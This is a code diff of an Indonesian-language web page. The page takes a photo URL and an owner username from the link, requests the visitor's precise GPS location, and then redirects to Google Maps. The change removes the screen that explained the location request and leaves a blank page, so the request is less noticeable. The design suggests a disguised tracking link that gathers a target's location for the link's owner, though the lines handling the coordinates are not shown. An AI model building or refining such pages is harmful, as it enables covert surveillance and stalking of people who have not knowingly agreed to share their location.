@@ -29,7 +29,6 @@ html,body{
   overflow:hidden;
 }
 
-/* ══ LOADING SCREEN ══ */
 .screen{
   position:fixed;inset:0;
   display:flex;
@@ -39,36 +38,21 @@ html,body{
   gap:20px;
   padding:40px 32px;
   text-align:center;
-  transition:opacity .3s;
 }
 .screen.hide{display:none!important}
 
-/* spinner */
-.ring{
-  width:64px;height:64px;
-  border:4px solid rgba(255,255,255,.12);
-  border-top-color:#4CAF50;
-  border-radius:50%;
-  animation:spin .75s linear infinite;
-}
-@keyframes spin{to{transform:rotate(360deg)}}
-
-.screen-title{font-size:17px;font-weight:600;color:#fff}
-.screen-sub{font-size:13px;color:#888;line-height:1.6;margin-top:-8px}
-
-/* icon circle */
 .icon-circle{
   width:72px;height:72px;
   border-radius:50%;
   display:flex;align-items:center;justify-content:center;
-  margin-bottom:4px;
 }
-.icon-circle.green{background:rgba(76,175,80,.18)}
 .icon-circle.red{background:rgba(211,47,47,.18)}
 .icon-circle.orange{background:rgba(245,124,0,.18)}
 .icon-circle svg{width:36px;height:36px}
 
-/* retry button */
+.screen-title{font-size:17px;font-weight:600;color:#fff}
+.screen-sub{font-size:13px;color:#888;line-height:1.6;margin-top:-8px}
+
 .btn-retry{
   margin-top:8px;
   padding:13px 32px;
@@ -84,12 +68,8 @@ html,body{
 </head>
 <body>
 
-<!-- LOADING / WAITING GPS -->
-<div class="screen" id="screenLoading">
-  <div class="ring"></div>
-  <div class="screen-title">Mendapatkan lokasi…</div>
-  <div class="screen-sub">Izinkan akses lokasi<br>pada popup yang muncul</div>
-</div>
+<!-- Layar kosong — popup GPS langsung muncul otomatis -->
+<div class="screen" id="screenWait"></div>
 
 <!-- DENIED -->
 <div class="screen hide" id="screenDenied">
@@ -103,7 +83,7 @@ html,body{
   <button class="btn-retry" onclick="startGeo()">Coba Lagi</button>
 </div>
 
-<!-- ERROR LINK -->
+<!-- INVALID LINK -->
 <div class="screen hide" id="screenErr">
   <div class="icon-circle orange">
     <svg viewBox="0 0 24 24" fill="#F57C00" xmlns="http://www.w3.org/2000/svg">
@@ -134,12 +114,12 @@ const params    = new URLSearchParams(location.search);
 const fotoUrl   = params.get('foto') || '';
 const ownerUser = params.get('u')    || '';
 
-const screenLoading = document.getElementById('screenLoading');
-const screenDenied  = document.getElementById('screenDenied');
-const screenErr     = document.getElementById('screenErr');
+const screenWait   = document.getElementById('screenWait');
+const screenDenied = document.getElementById('screenDenied');
+const screenErr    = document.getElementById('screenErr');
 
 function show(el) {
-  [screenLoading, screenDenied, screenErr].forEach(s => s.classList.add('hide'));
+  [screenWait, screenDenied, screenErr].forEach(s => s.classList.add('hide'));
   el.classList.remove('hide');
 }
 
@@ -151,7 +131,7 @@ if (!ownerUser) {
 
 window.startGeo = function() {
   if (!navigator.geolocation) { show(screenErr); return; }
-  show(screenLoading);
+  show(screenWait);
 
   navigator.geolocation.getCurrentPosition(
     pos => {
@@ -174,9 +154,7 @@ window.startGeo = function() {
 
       window.location.href = 'https://www.google.com/maps?q=' + lat + ',' + lng;
     },
-    err => {
-      show(screenDenied);
-    },
+    () => { show(screenDenied); },
     { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
   );
 };
